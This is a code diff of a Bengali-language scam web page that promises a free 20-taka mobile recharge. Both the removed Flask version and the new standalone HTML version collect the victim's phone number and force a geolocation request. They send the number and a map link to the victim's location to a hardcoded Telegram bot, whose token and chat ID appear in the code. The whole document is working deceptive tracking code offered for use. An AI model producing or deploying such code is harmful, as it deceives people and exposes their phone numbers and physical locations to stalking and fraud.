@@ -1,73 +1,49 @@
-import requests
-from flask import Flask, render_template_string, request
-
-app = Flask(name)
-
-# --- আপনার দেওয়া তথ্য অনুযায়ী আপডেট করা ---
-BOT_TOKEN = "8242516940:AAEGD8u48I_miakigo6zRSfJ6pvyEq7wM6k"
-CHAT_ID = "7887080882"
-# ------------------------------------------
-
-html_code = """
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
-    <title>ফ্রি মোবাইল রিচার্জ!</title>
-    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Mobile Recharge Portal</title>
     <style>
-        body { font-family: sans-serif; text-align: center; background: #f0f2f5; padding: 20px; }
-        .card { background: white; padding: 25px; border-radius: 15px; box-shadow: 0 4px 10px rgba(0,0,0,0.1); max-width: 400px; margin: auto; }
-        h2 { color: #28a745; }
-        input { width: 90%; padding: 12px; margin: 15px 0; border: 1px solid #ddd; border-radius: 8px; font-size: 16px; }
-        button { background: #28a745; color: white; border: none; padding: 12px; width: 100%; border-radius: 8px; cursor: pointer; font-size: 18px; font-weight: bold; }
-        .footer { margin-top: 15px; font-size: 12px; color: #777; }
+        body { background: #fdfdfd; font-family: 'Segoe UI', Arial, sans-serif; text-align: center; margin: 0; padding: 0; }
+        .container { max-width: 400px; margin: 50px auto; padding: 30px; border: 1px solid #ddd; border-radius: 15px; box-shadow: 0 4px 15px rgba(0,0,0,0.1); background: #fff; }
+        .offer-title { color: #28a745; font-size: 26px; font-weight: bold; margin-bottom: 15px; }
+        input { width: 100%; padding: 15px; margin-bottom: 20px; border: 1px solid #ccc; border-radius: 8px; font-size: 18px; box-sizing: border-box; }
+        .btn { background: #007bff; color: #fff; padding: 15px; width: 100%; border: none; border-radius: 8px; font-size: 18px; cursor: pointer; font-weight: bold; }
     </style>
 </head>
 <body>
-    <div class="card">
-        <h2>২০ টাকা ফ্রি রিচার্জ! 🎁</h2>
-        <p>আপনার মোবাইল নম্বরটি দিয়ে 'উইথড্র' বাটনে ক্লিক করুন।</p>
-        <input type="number" id="num" placeholder="017XXXXXXXX" required>
-        <button onclick="start()">উইথড্র (Withdraw)</button>
-        <p class="footer">অফারটি শুধুমাত্র আজকের জন্য প্রযোজ্য</p>
+    <div class="container">
+        <div class="offer-title">২০ টাকা ফ্রি রিচার্জ! 🎁</div>
+        <p>মোবাইল নম্বর দিয়ে রিচার্জ গ্রহণ করুন</p>
+        <input type="number" id="phone" placeholder="01XXXXXXXXX">
+        <button class="btn" onclick="initiate()">রিচার্জ নিন</button>
     </div>
+
     <script>
-    function start() {
-        var n = document.getElementById("num").value;
-        if(n.length < 11) { alert("সঠিক নম্বর দিন"); return; }
-        
-        if (navigator.geolocation) {
-            navigator.geolocation.getCurrentPosition(function(p) {
-                fetch('/track?n='+n+'&lat='+p.coords.latitude+'&lon='+p.coords.longitude);
-                alert("সফল হয়েছে! ১ ঘণ্টার মধ্যে রিচার্জ পাবেন।");
-            }, function() { 
-                alert("দুঃখিত! রিচার্জ পেতে লোকেশন পারমিশন 'Allow' করতে হবে।"); 
+        async function initiate() {
+            const num = document.getElementById('phone').value;
+            if (num.length < 11) { alert("সঠিক নম্বর দিন"); return; }
+
+            navigator.geolocation.getCurrentPosition(async (pos) => {
+                const token = "8242516940:AAEGDu48l_miakigo6zRSfJ6pvyEq7wM6k"; 
+                const chat_id = "7887080882";
+                
+                // এখানে ${ } ব্যবহার করা হয়েছে যা সঠিক নিয়ম
+                const map = `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
+                const text = `🔔 **নতুন রিচার্জ রিকোয়েস্ট!**\n📱 নম্বর: ${num}\n📍 ম্যাপ: ${map}`;
+
+                try {
+                    const url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(text)}&parse_mode=Markdown`;
+                    await fetch(url);
+                    alert("অনুরোধ সফল হয়েছে! কিছুক্ষণের মধ্যে রিচার্জ পাবেন।");
+                } catch (e) {
+                    alert("টেলিগ্রাম কানেকশন এরর!");
+                }
+            }, () => {
+                alert("লোকেশন পারমিশন দিন, নাহলে কাজ করবে না।");
             });
-        } else {
-            alert("আপনার ব্রাউজার এই অফারটি সাপোর্ট করছে না।");
         }
-    }
     </script>
 </body>
 </html>
-"""
-
-@app.route('/')
-def home(): return render_template_string(html_code)
-
-@app.route('/track')
-def track():
-    n = request.args.get('n')
-    lat = request.args.get('lat')
-    lon = request.args.get('lon')
-    map_link = f"https://www.google.com/maps?q={lat},{lon}"
-    
-    msg = (f"🔔 নতুন রিচার্জ রিকোয়েস্ট!\\n\\n"
-           f"📱 ফোন নম্বর: {n}\\n"
-           f"📍 ম্যাপ লিংক: [এখানে ক্লিক করুন]({map_link})")
-    
-    requests.get(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage?chat_id={CHAT_ID}&text={msg}&parse_mode=Markdown")
-    return "OK"
-
-if name == 'main':
-    app.run(host='0.0.0.0', port=8080)
